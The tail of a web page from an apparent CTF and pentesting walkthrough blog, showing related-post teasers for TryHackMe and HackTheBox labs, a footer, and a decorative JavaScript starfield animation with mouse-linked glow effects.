Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
